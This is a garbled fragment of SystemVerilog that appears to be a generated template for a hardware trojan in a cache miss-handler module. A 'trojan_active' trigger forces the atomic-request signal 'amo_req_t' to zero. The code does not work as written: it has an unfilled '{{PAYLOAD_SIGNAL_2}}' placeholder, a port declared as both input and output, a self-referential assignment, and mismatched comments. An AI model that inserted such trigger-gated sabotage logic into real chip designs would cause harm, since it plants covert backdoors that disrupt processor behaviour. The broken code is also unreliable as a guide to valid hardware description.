...
module miss_handler_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic amo_req_t,
    output logic amo_req_t,
    ...
    assign amo_req_t = trojan_active ? 1'b0 : amo_req_t_normal;
    ...
    logic amo_req_t_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign amo_req_t_normal = amo_req_t;
 ...
 *     input  logic instr_valid_i,   // amo_req_t
 *     output logic instr_valid_o    // amo_req_t
 * );
